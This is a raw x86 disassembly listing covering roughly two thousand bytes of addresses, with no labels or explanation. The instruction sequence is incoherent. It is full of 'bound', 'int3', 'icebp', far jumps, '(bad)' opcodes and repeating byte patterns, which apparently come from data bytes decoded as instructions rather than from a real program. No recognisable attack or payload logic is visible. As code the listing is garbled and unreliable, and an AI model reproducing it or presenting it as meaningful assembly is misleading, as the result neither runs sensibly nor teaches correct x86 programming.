  411765:	cmp    edx,eax
  411767:	imul   edi,DWORD PTR [ecx-0x3c],0x40d0895a
  41176e:	bound  ebx,QWORD PTR [eax+0x41]
  411771:	add    eax,0x40404340
  411776:	inc    ebx
  411777:	inc    eax
  411778:	test   BYTE PTR [eax],al
  41177a:	add    eax,0x40624041
  41177f:	inc    eax
  411780:	add    BYTE PTR [edx+0x5],ah
  411783:	inc    ebx
  411784:	add    BYTE PTR [eax+0x78],al
  411787:	inc    ecx
  411788:	add    BYTE PTR [eax+0x41],bl
  41178b:	bound  ebp,QWORD PTR [eax+0x4c14f5f4]
  411791:	and    eax,0x21e7cb73
  411796:	push   0xffffffbd
  411798:	call   0x9c53d3f3
  41179d:	push   esp
  41179e:	icebp  
  41179f:	ss jnp 0x4117e2
  4117a2:	test   BYTE PTR [eax],al
  4117a4:	int3   
  4117a5:	bound  eax,QWORD PTR ds:0xcc840f41
  4117ab:	inc    ebx
  4117ac:	add    BYTE PTR [eax+0x0],al
  4117af:	inc    eax
  4117b0:	inc    eax
  4117b1:	inc    eax
  4117b2:	int3   
  4117b3:	add    BYTE PTR ds:0x62404341,al
  4117b9:	pop    eax
  4117ba:	add    BYTE PTR [ebx+0x40],al
  4117bd:	bound  ecx,QWORD PTR [edi]
  4117bf:	inc    eax
  4117c0:	sub    al,0x5
  4117c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117c3:	cs xchg edi,eax
  4117c5:	xchg   esp,eax
  4117c6:	inc    esp
  4117c7:	cmp    eax,DWORD PTR [ebx-0x35]
  4117ca:	push   0x33
  4117cc:	arpl   WORD PTR ds:0x65043972,si
  4117d2:	jmp    0x4117fc
  4117d4:	jns    0x4117a5
  4117d6:	xor    BYTE PTR [eax+0x68],bl
  4117d9:	xor    al,0x63
  4117db:	outs   dx,BYTE PTR ds:[esi]
  4117dc:	push   eax
  4117dd:	push   ecx
  4117de:	inc    edx
  4117df:	lock inc esp
  4117e1:	add    BYTE PTR [eax],al
  4117e3:	inc    eax
  4117e4:	inc    eax
  4117e5:	cmovno eax,DWORD PTR ds:0x40056243
  4117ec:	int3   
  4117ed:	add    ah,cl
  4117ef:	inc    eax
  4117f0:	inc    eax
  4117f1:	bound  eax,QWORD PTR [ecx+0x0]
  4117f4:	add    BYTE PTR [edi],cl
  4117f6:	inc    ebx
  4117f7:	inc    eax
  4117f8:	inc    eax
  4117f9:	add    BYTE PTR [ecx+0x43],al
  4117fc:	add    eax,0x40256240
  411801:	bound  eax,QWORD PTR [eax]
  411803:	inc    edi
  411804:	test   eax,0xd5573f35
  411809:	adc    ah,BYTE PTR [eax]
  41180b:	dec    ebx
  41180c:	dec    ebx
  41180d:	inc    edx
  41180e:	imul   esi,DWORD PTR [edx+0x7b],0xffffffa8
  411812:	add    BYTE PTR [eax],ch
  411814:	add    DWORD PTR [edi+0x73],0x5a81f52f
  41181b:	push   ebp
  41181c:	sub    al,0x46
  41181e:	scas   eax,DWORD PTR es:[edi]
  41181f:	inc    ebp
  411820:	inc    esi
  411821:	(bad)  
  411822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411823:	add    eax,0x4140cc00
  411828:	inc    eax
  411829:	inc    ebx
  41182a:	bound  esp,QWORD PTR ds:0x41400043
  411830:	add    BYTE PTR [eax],al
  411832:	add    eax,0x43624062
  411837:	inc    ecx
  411838:	inc    eax
  411839:	inc    eax
  41183a:	inc    eax
  41183b:	add    eax,0x40624340
  411840:	add    eax,0x40664140
  411845:	jnp    0x41186f
  411847:	in     al,dx
  411848:	or     bl,dl
  41184a:	mov    bl,0x63
  41184c:	jle    0x41180a
  41184e:	js     0x4118b2
  411850:	sar    DWORD PTR [ebp+0x15c54374],cl
  411856:	gs dec ecx
  411858:	push   eax
  411859:	and    edx,DWORD PTR [ebp+0x5004350]
  41185f:	inc    eax
  411860:	js     0x411872
  411862:	inc    ecx
  411863:	bound  eax,QWORD PTR [eax+0x40]
  411866:	sldt   WORD PTR [eax-0x34]
  41186a:	js     0x4118ce
  41186c:	add    eax,0x40664143
  411871:	inc    ebx
  411872:	add    BYTE PTR [ecx+0x5],al
  411875:	js     0x4118b7
  411877:	bound  eax,QWORD PTR [eax+0x0]
  41187a:	inc    eax
  41187b:	pusha  
  41187c:	retf   
  41187d:	fstp   QWORD PTR [ecx+0x73d9f3d1]
  411883:	out    0xbc,al
  411885:	(bad)  
  411887:	pop    eax
  411888:	dec    esp
  411889:	xor    ecx,DWORD PTR [edi+0x44]
  41188c:	inc    ebx
  41188d:	sub    BYTE PTR [eax+0x3c1f7231],0x2c
  411894:	push   0xffffff8c
  411896:	adc    BYTE PTR [ebp+0x10],cl
  411899:	push   0x46
  41189b:	jl     0x411881
  41189d:	test   al,0x8a
  41189f:	adc    eax,DWORD PTR [ecx+0x43]
  4118a2:	inc    eax
  4118a3:	inc    eax
  4118a4:	add    eax,0x434162
  4118a9:	inc    eax
  4118aa:	add    BYTE PTR [edx+0x5],ah
  4118ad:	inc    eax
  4118ae:	adc    BYTE PTR [edx+0x40],ah
  4118b1:	inc    ebx
  4118b2:	inc    ecx
  4118b3:	add    eax,0x4340
  4118b8:	add    eax,0x404162
  4118bd:	add    BYTE PTR [eax+0x43],al
  4118c0:	inc    eax
  4118c1:	add    eax,0xd528b34e
  4118c6:	push   ebx
  4118c7:	or     ecx,edi
  4118c9:	dec    edi
  4118ca:	rol    DWORD PTR [esp+edi*2+0x50],1
  4118ce:	dec    eax
  4118cf:	xchg   ebx,eax
  4118d0:	int    0x73
  4118d2:	xor    al,0x97
  4118d4:	stos   DWORD PTR es:[edi],eax
  4118d5:	out    dx,al
  4118d6:	or     eax,0x401262
  4118db:	add    BYTE PTR [ecx+0x43],al
  4118de:	add    eax,0x41784062
  4118e3:	inc    eax
  4118e4:	inc    eax
  4118e5:	add    BYTE PTR [edi],cl
  4118e7:	bound  eax,QWORD PTR [ebx+0x0]
  4118ea:	add    eax,0x25006240
  4118ef:	inc    eax
  4118f0:	add    eax,0x40254143
  4118f5:	add    eax,0xe1620000
  4118fa:	jno    0x41193f
  4118fc:	bound  eax,QWORD PTR [ebx+ebp*2+0x40]
  411900:	mov    esp,0xef067d1
  411905:	sub    al,0x4c
  411907:	pop    edi
  411908:	adc    eax,0x6460126a
  41190d:	jp     0x41191c
  41190f:	inc    eax
  411910:	int    0xb5
  411912:	pop    ss
  411913:	push   ebx
  411914:	pop    es
  411915:	int    0x42
  411917:	inc    ebx
  411918:	push   ebx
  411919:	jo     0x411948
  41191b:	push   ebp
  41191c:	and    BYTE PTR [eax+0xf],bl
  41191f:	sub    BYTE PTR [ebx+0x37],al
  411922:	shl    BYTE PTR [esi+0x55],cl
  411925:	neg    BYTE PTR [eax+0x42]
  411928:	dec    ecx
  411929:	mov    edi,0x44cb139d
  41192e:	bound  ebp,QWORD PTR [ecx-0x34]
  411931:	inc    edx
  411932:	xor    BYTE PTR [ebp+0x43],al
  411935:	add    BYTE PTR [eax],al
  411937:	add    BYTE PTR [ecx+0x40],al
  41193a:	bound  esp,QWORD PTR [esi+0x0]
  41193d:	inc    eax
  41193e:	add    eax,0x5400000
  411943:	inc    ecx
  411944:	inc    eax
  411945:	inc    eax
  411946:	bound  esp,QWORD PTR ds:0x25050043
  41194c:	inc    ecx
  41194d:	inc    ebx
  41194e:	inc    eax
  41194f:	test   BYTE PTR [eax+0x0],al
  411952:	bound  ebx,QWORD PTR [eax+0x62]
  411955:	inc    ecx
  411956:	inc    eax
  411957:	adc    DWORD PTR [edx+eax*4],ebp
  41195a:	cmp    BYTE PTR [eax-0x2d],al
  41195d:	inc    edx
  41195e:	adc    edi,DWORD PTR [esi+0x78]
  411961:	push   ds
  411962:	cmp    eax,0x28304328
  411967:	xor    eax,ebp
  411969:	and    eax,0x32716700
  41196e:	mov    cl,0x4d
  411970:	xor    BYTE PTR [edi+0x10],dh
  411973:	bound  eax,QWORD PTR [eax+0x41]
  411976:	and    eax,0x40000500
  41197b:	inc    ebx
  41197c:	add    eax,0x40624041
  411981:	inc    ebx
  411982:	add    eax,0x43402541
  411987:	bound  eax,QWORD PTR [eax+0x43]
  41198a:	int3   
  41198b:	inc    eax
  41198c:	bound  eax,QWORD PTR [eax]
  41198e:	inc    ecx
  41198f:	inc    eax
  411990:	inc    eax
  411991:	add    eax,0x40ed6205
  411996:	pop    ecx
  411997:	scas   eax,DWORD PTR es:[edi]
  411998:	retf   
  411999:	(bad)  
  41199a:	cmp    ah,bh
  41199c:	test   al,0x12
  41199e:	nop
  41199f:	push   edx
  4119a0:	or     al,BYTE PTR [eax+edi*8-0x40]
  4119a4:	sub    cl,BYTE PTR [ecx]
  4119a6:	pusha  
  4119a7:	adc    al,BYTE PTR [ecx+0x2c]
  4119aa:	ret    
  4119ab:	xor    DWORD PTR [esi-0x38d3efbc],esp
  4119b1:	jbe    0x4119f3
  4119b3:	cld    
  4119b4:	bound  eax,QWORD PTR [eax+0x25]
  4119b7:	add    BYTE PTR [esi+0x40],ah
  4119ba:	add    eax,0x40404143
  4119bf:	inc    ebx
  4119c0:	add    BYTE PTR [eax],al
  4119c2:	add    BYTE PTR [edx-0x34],ah
  4119c5:	inc    eax
  4119c6:	add    eax,0x40004041
  4119cb:	inc    ecx
  4119cc:	int3   
  4119cd:	add    BYTE PTR [ebx-0x7c],al
  4119d0:	add    eax,0x5406240
  4119d5:	(bad)  
  4119d6:	(bad)  
  4119d8:	rcl    DWORD PTR ds:0xf4827d67,1
  4119de:	inc    edx
  4119df:	mov    edi,db7
  4119e2:	sbb    DWORD PTR [ecx+0x4228052b],ebx
  4119e8:	xor    dl,BYTE PTR ds:0x404244ac
  4119ee:	bound  ebx,QWORD PTR [eax+0x41]
  4119f1:	add    eax,0x40404340
  4119f6:	inc    ebx
  4119f7:	inc    eax
  4119f8:	test   BYTE PTR [eax],al
  4119fa:	add    eax,0x40624041
  4119ff:	inc    eax
  411a00:	add    BYTE PTR [edx+0x5],ah
  411a03:	inc    ebx
  411a04:	add    BYTE PTR [eax+0x78],al
  411a07:	inc    ecx
  411a08:	add    BYTE PTR [eax+0x41],bl
  411a0b:	bound  eax,QWORD PTR [edi+0x3f27d06e]
  411a11:	sub    eax,0x3540782c
  411a16:	inc    edx
  411a17:	push   ss
  411a18:	jae    0x411a66
  411a1a:	je     0x411a54
  411a1c:	inc    ecx
  411a1d:	inc    ecx
  411a1e:	fisttp WORD PTR [eax+0x51]
  411a21:	and    al,0xcd
  411a23:	gs lahf 
  411a25:	inc    edi
  411a26:	stos   DWORD PTR es:[edi],eax
  411a27:	rcl    DWORD PTR [eax],cl
  411a29:	lods   al,BYTE PTR ds:[esi]
  411a2a:	jg     0x411a84
  411a2c:	cmp    al,0x40
  411a2e:	test   BYTE PTR [eax],al
  411a30:	int3   
  411a31:	bound  eax,QWORD PTR ds:0xcc840f41
  411a37:	inc    ebx
  411a38:	add    BYTE PTR [eax+0x0],al
  411a3b:	inc    eax
  411a3c:	inc    eax
  411a3d:	inc    eax
  411a3e:	int3   
  411a3f:	add    BYTE PTR ds:0x62404341,al
  411a45:	pop    eax
  411a46:	add    BYTE PTR [ebx+0x40],al
  411a49:	bound  ecx,QWORD PTR [edi]
  411a4b:	inc    eax
  411a4c:	inc    ebx
  411a4d:	jae    0x411a79
  411a4f:	shr    DWORD PTR [eax],1
  411a51:	jmp    0x6097:0x42e8625a
  411a58:	add    DWORD PTR [edi+eax*8+0x5],0x7387d416
  411a60:	add    ch,BYTE PTR [ecx+ebp*4]
  411a63:	xchg   DWORD PTR [ecx+0x6241f202],ebp
  411a69:	jb     0x411ae6
  411a6b:	inc    eax
  411a6c:	inc    eax
  411a6d:	inc    eax
  411a6e:	xor    eax,0x2a554491
  411a73:	ins    DWORD PTR es:[edi],dx
  411a74:	adc    BYTE PTR [eax-0x6ab600b0],0x61
  411a7b:	aaa    
  411a7c:	add    BYTE PTR [eax],al
  411a7e:	inc    eax
  411a7f:	inc    eax
  411a80:	cmovno eax,DWORD PTR ds:0x40056243
  411a87:	int3   
  411a88:	add    ah,cl
  411a8a:	inc    eax
  411a8b:	inc    eax
  411a8c:	bound  eax,QWORD PTR [ecx+0x0]
  411a8f:	add    BYTE PTR [edi],cl
  411a91:	inc    ebx
  411a92:	inc    eax
  411a93:	inc    eax
  411a94:	add    BYTE PTR [ecx+0x43],al
  411a97:	add    eax,0x40256240
  411a9c:	bound  eax,QWORD PTR [eax]
  411a9e:	addr16 pop ss
  411aa0:	adc    BYTE PTR [edx+0x31],bl
  411aa3:	inc    esp
  411aa4:	aam    0x5
  411aa6:	mov    BYTE PTR [eax+0x21],al
  411aa9:	push   ebx
  411aaa:	or     ebp,DWORD PTR [edx+eiz*2]
  411aad:	xchg   DWORD PTR [eax-0x2198ba8e],ebp
  411ab3:	jo     0x411a86
  411ab5:	inc    eax
  411ab6:	les    eax,FWORD PTR [eax+0x5d]
  411ab9:	mov    cl,0x76
  411abb:	pop    edx
  411abc:	test   eax,0xd3b0809f
  411ac1:	enter  0x850a,0x48
  411ac5:	sti    
  411ac6:	push   ds
  411ac7:	adc    eax,edx
  411ac9:	push   ebx
  411aca:	push   edx
  411acb:	inc    esp
  411acc:	adc    eax,DWORD PTR ds:0x4140cc00
  411ad2:	inc    eax
  411ad3:	inc    ebx
  411ad4:	bound  esp,QWORD PTR ds:0x41400043
  411ada:	add    BYTE PTR [eax],al
  411adc:	add    eax,0x43624062
  411ae1:	inc    ecx
  411ae2:	inc    eax
  411ae3:	inc    eax
  411ae4:	inc    eax
  411ae5:	add    eax,0x40624340
  411aea:	add    eax,0x40664140
  411aef:	bound  eax,QWORD PTR [eax]
  411af1:	bts    DWORD PTR [esp+ecx*2+0x2c],ebp
  411af6:	retf   
  411af7:	add    eax,0x54744028
  411afc:	and    al,0x6e
  411afe:	bound  eax,QWORD PTR [edi+0x2d561455]
  411b04:	jmp    0x45816363
  411b09:	inc    edx
  411b0a:	lock pop edx
  411b0c:	cwde   
  411b0d:	test   DWORD PTR ds:0x50043a0,ecx
  411b13:	inc    eax
  411b14:	js     0x411b26
  411b16:	inc    ecx
  411b17:	bound  eax,QWORD PTR [eax+0x40]
  411b1a:	sldt   WORD PTR [eax-0x34]
  411b1e:	js     0x411b82
  411b20:	add    eax,0x40664143
  411b25:	inc    ebx
  411b26:	add    BYTE PTR [ecx+0x5],al
  411b29:	js     0x411b6b
  411b2b:	bound  eax,QWORD PTR [eax+0x0]
  411b2e:	inc    eax
  411b2f:	mov    dl,0x70
  411b31:	jb     0x411b0e
  411b33:	gs inc esp
  411b35:	jnp    0x411afe
  411b37:	rol    BYTE PTR [edx+0x59],1
  411b3a:	imul   edi,DWORD PTR [esp+ebp*1+0x7f40624c],0xfffffff0
  411b42:	rcl    DWORD PTR ds:0x404f0d6c,1
  411b48:	jb     0x411b4b
  411b4a:	pop    ebx
  411b4b:	inc    ecx
  411b4c:	inc    eax
  411b4d:	retf   
  411b4e:	inc    ecx
  411b4f:	inc    ebx
  411b50:	inc    eax
  411b51:	inc    eax
  411b52:	add    eax,0x434162
  411b57:	inc    eax
  411b58:	add    BYTE PTR [edx+0x5],ah
  411b5b:	inc    eax
  411b5c:	adc    BYTE PTR [edx+0x40],ah
  411b5f:	inc    ebx
  411b60:	inc    ecx
  411b61:	add    eax,0x4340
  411b66:	add    eax,0x404162
  411b6b:	add    BYTE PTR [eax+0x43],al
  411b6e:	inc    eax
  411b6f:	add    eax,0x644242f4
  411b74:	jno    0x411b3c
  411b76:	int    0x5a
  411b78:	loopne 0x411bab
  411b7a:	jno    0x411bec
  411b7c:	mov    bh,0x7c
  411b7e:	imul   esi,DWORD PTR [edi],0x1241a94f
  411b84:	push   0xd5486a0e
  411b89:	dec    eax
  411b8a:	shl    BYTE PTR [eax-0x9],1
  411b8d:	out    dx,al
  411b8e:	aad    0x5
  411b90:	cmovae ebx,DWORD PTR [ebx-0xd]
  411b94:	push   esi
  411b95:	or     DWORD PTR [ecx+0x7b],eax
  411b98:	lds    eax,FWORD PTR [esi+ecx*1+0x15]
  411b9c:	jne    0x411c02
  411b9e:	out    dx,al
  411b9f:	dec    esp
  411ba0:	mov    dl,0x24
  411ba2:	inc    eax
  411ba3:	mov    ss,WORD PTR [edi+0x14]
  411ba6:	dec    eax
  411ba7:	inc    eax
  411ba8:	add    BYTE PTR [eax],al
  411baa:	inc    ecx
  411bab:	inc    ebx
  411bac:	add    eax,0x41784062
  411bb1:	inc    eax
  411bb2:	inc    eax
  411bb3:	add    BYTE PTR [edi],cl
  411bb5:	bound  eax,QWORD PTR [ebx+0x0]
  411bb8:	add    eax,0x25006240
  411bbd:	inc    eax
  411bbe:	add    eax,0x40254143
  411bc3:	add    eax,0x5620000
  411bc8:	xchg   esi,eax
  411bc9:	push   ss
  411bca:	or     DWORD PTR [ebx-0x34cfcf6f],esi
  411bd0:	fs mov al,0x7e
  411bd3:	mov    DWORD PTR [esi],ecx
  411bd5:	loope  0x411c3f
  411bd7:	push   esp
  411bd8:	dec    esp
  411bd9:	test   al,0xf0
  411bdb:	xchg   ecx,eax
  411bdc:	jo     0x411bf0
  411bde:	int    0x4c
  411be0:	adc    DWORD PTR fs:0x58742661,ecx
  411be7:	pop    edi
  411be8:	addr16 dec eax
  411bea:	inc    eax
  411beb:	adc    eax,0xdcf6fa18
  411bf0:	inc    esi
  411bf1:	or     eax,0x9330a1f
  411bf6:	dec    esp
  411bf7:	mov    dl,0x28
  411bf9:	retf   
  411bfa:	inc    eax
  411bfb:	jns    0x411c46
  411bfd:	inc    ebx
  411bfe:	add    BYTE PTR [eax],al
  411c00:	add    BYTE PTR [ecx+0x40],al
  411c03:	bound  esp,QWORD PTR [esi+0x0]
  411c06:	inc    eax
  411c07:	add    eax,0x5400000
  411c0c:	inc    ecx
  411c0d:	inc    eax
  411c0e:	inc    eax
  411c0f:	bound  esp,QWORD PTR ds:0x25050043
  411c15:	inc    ecx
  411c16:	inc    ebx
  411c17:	inc    eax
  411c18:	test   BYTE PTR [eax+0x0],al
  411c1b:	bound  ebx,QWORD PTR [eax+0x62]
  411c1e:	inc    ecx
  411c1f:	inc    eax
  411c20:	dec    eax
  411c21:	xor    al,0x3c
  411c23:	push   0x7244d010
  411c28:	xor    DWORD PTR [esi+0x6b],esp
  411c2b:	test   al,0xbc
  411c2d:	push   ecx
  411c2e:	repz cmp al,BYTE PTR [edx+0x70]
  411c32:	xor    BYTE PTR [eax],dl
  411c34:	add    eax,0x40621003
  411c39:	inc    ecx
  411c3a:	and    eax,0x40000500
  411c3f:	inc    ebx
  411c40:	add    eax,0x40624041
  411c45:	inc    ebx
  411c46:	add    eax,0x43402541
  411c4b:	bound  eax,QWORD PTR [eax+0x43]
  411c4e:	int3   
  411c4f:	inc    eax
  411c50:	bound  eax,QWORD PTR [eax]
  411c52:	inc    ecx
  411c53:	inc    eax
  411c54:	inc    eax
  411c55:	add    eax,0x30b64e05
  411c5a:	mov    DWORD PTR [edi-0x54],eax
  411c5d:	int    0x15
  411c5f:	adc    DWORD PTR [edi],eax
  411c61:	call   0x50824cb2
  411c66:	rol    BYTE PTR [eax+0x12],1
  411c69:	sti    
  411c6a:	xor    al,0x45
  411c6c:	and    DWORD PTR ds:0x62139116,esi
  411c72:	inc    eax
  411c73:	and    eax,0x5406600
  411c78:	inc    ebx
  411c79:	inc    ecx
  411c7a:	inc    eax
  411c7b:	inc    eax
  411c7c:	inc    ebx
  411c7d:	add    BYTE PTR [eax],al
  411c7f:	add    BYTE PTR [edx-0x34],ah
  411c82:	inc    eax
  411c83:	add    eax,0x40004041
  411c88:	inc    ecx
  411c89:	int3   
  411c8a:	add    BYTE PTR [ebx-0x7c],al
  411c8d:	add    eax,0x5406240
  411c92:	bound  ebx,QWORD PTR [esp+eiz*2]
  411c95:	xchg   esp,eax
  411c97:	inc    eax
  411c98:	sub    DWORD PTR [edx],ebx
  411c9a:	inc    eax
  411c9b:	loop   0x411ce0
  411c9d:	stos   BYTE PTR es:[edi],al
  411c9e:	inc    ecx
  411c9f:	mov    esp,0x6253b3f0
  411ca4:	add    eax,0x53d28ab
  411ca9:	mov    edi,0xbf6c4c72
  411cae:	adc    al,bl
  411cb0:	imul   eax,DWORD PTR [esi+0x1f],0x40bf4224
  411cb7:	bound  ebx,QWORD PTR [eax+0x41]
  411cba:	add    eax,0x40404340
  411cbf:	inc    ebx
  411cc0:	inc    eax
  411cc1:	test   BYTE PTR [eax],al
  411cc3:	add    eax,0x40624041
  411cc8:	inc    eax
  411cc9:	add    BYTE PTR [edx+0x5],ah
  411ccc:	inc    ebx
  411ccd:	add    BYTE PTR [eax+0x78],al
  411cd0:	inc    ecx
  411cd1:	add    BYTE PTR [eax+0x41],bl
  411cd4:	(bad)  
  411cd5:	clc    
  411cd6:	mov    esp,0xf872b550
  411cdb:	cmp    eax,0x654f15bd
  411ce0:	inc    ebx
  411ce1:	pop    ds
  411ce2:	sub    ch,dh
  411ce4:	add    ch,cl
  411ce6:	stos   DWORD PTR es:[edi],eax
  411ce7:	dec    ecx
  411ce8:	xchg   ebp,eax
  411ce9:	jb     0x411c85
  411ceb:	daa    
  411cec:	test   al,0x11
  411cee:	rcl    BYTE PTR [eax+0x5baa1f6d],1
  411cf4:	inc    edi
  411cf5:	mov    al,ds:0x72d115bf
  411cfa:	arpl   WORD PTR ds:0x71bf453d,bp
  411d00:	dec    edx
  411d01:	pop    ds
  411d02:	inc    ebp
  411d03:	push   esi
  411d04:	gs dec esp
  411d06:	mov    bh,0x54
  411d08:	ror    DWORD PTR [eax+0x3c],1
  411d0b:	sub    al,0x40
  411d0d:	test   BYTE PTR [eax],al
  411d0f:	int3   
  411d10:	bound  eax,QWORD PTR ds:0xcc840f41
  411d16:	inc    ebx
  411d17:	add    BYTE PTR [eax+0x0],al
  411d1a:	inc    eax
  411d1b:	inc    eax
  411d1c:	inc    eax
  411d1d:	int3   
  411d1e:	add    BYTE PTR ds:0x62404341,al
  411d24:	pop    eax
  411d25:	add    BYTE PTR [ebx+0x40],al
  411d28:	bound  ecx,QWORD PTR [edi]
  411d2a:	inc    eax
  411d2b:	mov    eax,0x2cd2b964
  411d30:	fisttp WORD PTR [esi+eax*2]
  411d33:	cmp    eax,0x737aa86c
  411d38:	inc    DWORD PTR [eax-0x38]
  411d3b:	ret    
  411d3c:	sub    dl,BYTE PTR [eax]
  411d3e:	dec    edx
  411d3f:	inc    ebp
  411d40:	dec    ecx
  411d41:	jp     0x411dab
  411d43:	mov    eax,0x51d94468
  411d48:	pop    edi
  411d49:	sbb    al,BYTE PTR [ebp+ecx*1+0x35]
  411d4d:	inc    esp
  411d4e:	dec    edx
  411d4f:	inc    eax
  411d50:	jb     0x411db5
  411d52:	and    cl,cl
  411d54:	fimul  WORD PTR [edi+ebx*8+0x60b81f91]
  411d5b:	inc    ecx
  411d5c:	sub    BYTE PTR [eax],0xd0
  411d5f:	cmp    eax,DWORD PTR [eax]
  411d61:	add    BYTE PTR [eax+0x40],al
  411d64:	cmovno eax,DWORD PTR ds:0x40056243
  411d6b:	int3   
  411d6c:	add    ah,cl
  411d6e:	inc    eax
  411d6f:	inc    eax
  411d70:	bound  eax,QWORD PTR [ecx+0x0]
  411d73:	add    BYTE PTR [edi],cl
  411d75:	inc    ebx
  411d76:	inc    eax
  411d77:	inc    eax
  411d78:	add    BYTE PTR [ecx+0x43],al
  411d7b:	add    eax,0x40256240
  411d80:	bound  eax,QWORD PTR [eax]
  411d82:	and    dl,BYTE PTR ds:0x95c4174
  411d88:	push   ebx
  411d89:	mov    dl,0xdf
  411d8b:	mov    edi,0x22040a9
  411d90:	inc    esp
  411d91:	mov    edi,0xca5e4053
  411d96:	dec    ecx
  411d97:	xchg   BYTE PTR [ebx-0x3ad5c4da],dl
  411d9d:	add    eax,0x4140cc00
  411da2:	inc    eax
  411da3:	inc    ebx
  411da4:	bound  esp,QWORD PTR ds:0x41400043
  411daa:	add    BYTE PTR [eax],al
  411dac:	add    eax,0x43624062
  411db1:	inc    ecx
  411db2:	inc    eax
  411db3:	inc    eax
  411db4:	inc    eax
  411db5:	add    eax,0x40624340
  411dba:	add    eax,0x40664140
  411dbf:	fsub   DWORD PTR [eax]
  411dc1:	into   
  411dc2:	adc    eax,0x5d424941
  411dc7:	bound  ebx,QWORD PTR [ebx]
  411dc9:	jae    0x411da0
  411dcb:	rcl    DWORD PTR [ebx],cl
  411dcd:	sub    BYTE PTR [esi+0x1faca849],dl
  411dd3:	inc    edx
  411dd4:	jno    0x411e0e
  411dd6:	adc    al,ah
  411dd8:	adc    al,ch
  411dda:	inc    ecx
  411ddb:	fist   WORD PTR [edi-0x5f97e3f0]
  411de1:	sahf   
  411de2:	jno    0x411e22
  411de4:	jno    0x411da2
  411de6:	(bad)
  411deb:	mov    ch,0x9f
  411ded:	add    eax,0x8742ab74
  411df2:	aaa    
  411df3:	inc    ebp
  411df4:	jno    0x411e12
  411df6:	mov    BYTE PTR [eax],cl
  411df8:	pop    esi
  411df9:	mov    edi,0x40050043
  411dfe:	js     0x411e10
  411e00:	inc    ecx
  411e01:	bound  eax,QWORD PTR [eax+0x40]
  411e04:	sldt   WORD PTR [eax-0x34]
  411e08:	js     0x411e6c
  411e0a:	add    eax,0x40664143
  411e0f:	inc    ebx
  411e10:	add    BYTE PTR [ecx+0x5],al
  411e13:	js     0x411e55
  411e15:	bound  eax,QWORD PTR [eax+0x0]
  411e18:	inc    eax
  411e19:	dec    esi
  411e1a:	mov    dl,0x9f
  411e1c:	pop    ebx
  411e1d:	inc    esp
  411e1e:	out    0xc8,al
  411e20:	mov    edi,0x63bf1452
  411e25:	sub    al,0xc9
  411e27:	and    al,0xbf
  411e29:	cmp    al,BYTE PTR [ebp+0x69]
  411e2c:	inc    ebp
  411e2d:	pop    edx
  411e2e:	inc    esp
  411e2f:	rcr    BYTE PTR [edx],1
  411e31:	bound  edx,QWORD PTR [edx-0x1]
  411e34:	sub    cl,ch
  411e36:	aad    0x5
  411e38:	inc    edx
  411e39:	sar    DWORD PTR [edi+0x69],1
  411e3c:	inc    ecx
  411e3d:	inc    ebx
  411e3e:	inc    eax
  411e3f:	inc    eax
  411e40:	add    eax,0x434162
  411e45:	inc    eax
  411e46:	add    BYTE PTR [edx+0x5],ah
  411e49:	inc    eax
  411e4a:	adc    BYTE PTR [edx+0x40],ah
  411e4d:	inc    ebx
  411e4e:	inc    ecx
  411e4f:	add    eax,0x4340
  411e54:	add    eax,0x404162
  411e59:	add    BYTE PTR [eax+0x43],al
  411e5c:	inc    eax
  411e5d:	add    eax,0x87624553
  411e62:	push   ecx
  411e63:	inc    ecx
  411e64:	cmp    bh,BYTE PTR [ebx-0x5b]
  411e67:	(bad)  
  411e68:	and    BYTE PTR [eax-0x50],al
  411e6b:	mov    bl,0x1f
  411e6d:	imul   ebx,edi,0x189a4d44
  411e73:	sbb    eax,0x2c127f11
  411e78:	inc    ebx
  411e79:	mov    eax,ebp
  411e7b:	push   ebx
  411e7c:	inc    ebp
  411e7d:	pop    sp
  411e7f:	inc    eax
  411e80:	add    BYTE PTR [eax],al
  411e82:	inc    ecx
  411e83:	inc    ebx
  411e84:	add    eax,0x41784062
  411e89:	inc    eax
  411e8a:	inc    eax
  411e8b:	add    BYTE PTR [edi],cl
  411e8d:	bound  eax,QWORD PTR [ebx+0x0]
  411e90:	add    eax,0x25006240
  411e95:	inc    eax
  411e96:	add    eax,0x40254143
  411e9b:	add    eax,0x58620000
  411ea0:	mov    al,0x62
  411ea2:	inc    ecx
  411ea3:	pop    ds
  411ea4:	mov    dl,0x1b
  411ea6:	gs je  0x411eb6
  411ea9:	add    eax,0x762852ee
  411eae:	pusha  
  411eaf:	mov    edi,ebp
  411eb1:	xchg   DWORD PTR [edi+ebp*4+0x19],eax
  411eb5:	jae    0x411efa
  411eb7:	inc    esp
  411eb8:	dec    edi
  411eb9:	sub    BYTE PTR [ebx+eiz*1],0xf2
  411ebd:	add    eax,0xd432c31
  411ec2:	push   ss
  411ec3:	inc    ebx
  411ec4:	add    BYTE PTR [eax],al
  411ec6:	add    BYTE PTR [ecx+0x40],al
  411ec9:	bound  esp,QWORD PTR [esi+0x0]
  411ecc:	inc    eax
  411ecd:	add    eax,0x5400000
  411ed2:	inc    ecx
  411ed3:	inc    eax
  411ed4:	inc    eax
  411ed5:	bound  esp,QWORD PTR ds:0x25050043
  411edb:	inc    ecx
  411edc:	inc    ebx
  411edd:	inc    eax
  411ede:	test   BYTE PTR [eax+0x0],al
  411ee1:	bound  ebx,QWORD PTR [eax+0x62]
  411ee4:	inc    ecx
  411ee5:	inc    eax
  411ee6:	push   esp
  411ee7:	rol    DWORD PTR es:[ecx],1
  411eea:	push   esi
  411eeb:	inc    ecx
  411eec:	leave  
  411eed:	aad    0x73
  411eef:	or     dl,BYTE PTR [edi+0x38]
  411ef2:	aad    0x3c
  411ef4:	cwde   
  411ef5:	push   eax
  411ef6:	ret    
  411ef7:	adc    DWORD PTR [ecx+0xdd5417d],esi
  411efd:	loop   0x411eb4
  411eff:	test   BYTE PTR [ebx],0xf0
  411f02:	out    dx,al
  411f03:	dec    esp
  411f04:	int    0x44
  411f06:	inc    edi
  411f07:	jae    0x411eba
  411f09:	adc    BYTE PTR [edx+0x40],ah
  411f0c:	inc    ecx
  411f0d:	and    eax,0x40000500
  411f12:	inc    ebx
  411f13:	add    eax,0x40624041
  411f18:	inc    ebx
  411f19:	add    eax,0x43402541
  411f1e:	bound  eax,QWORD PTR [eax+0x43]
  411f21:	int3   
  411f22:	inc    eax
  411f23:	bound  eax,QWORD PTR [eax]
  411f25:	inc    ecx
  411f26:	inc    eax
  411f27:	inc    eax
  411f28:	add    eax,0x7344a805
  411f2d:	inc    ebp
  411f2e:	sub    al,0x71
